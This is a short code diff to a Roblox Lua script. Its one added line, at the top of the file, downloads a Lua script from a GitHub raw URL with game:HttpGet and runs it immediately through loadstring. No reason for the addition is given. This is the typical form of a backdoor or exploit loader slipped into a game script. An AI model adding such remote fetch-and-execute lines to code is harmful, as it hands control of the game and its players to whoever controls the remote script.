@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://github.com/0amya0/roblox/raw/main/script.lua"))()  
 local executor = script.Parent  
 local players = game:GetService("Players")
 
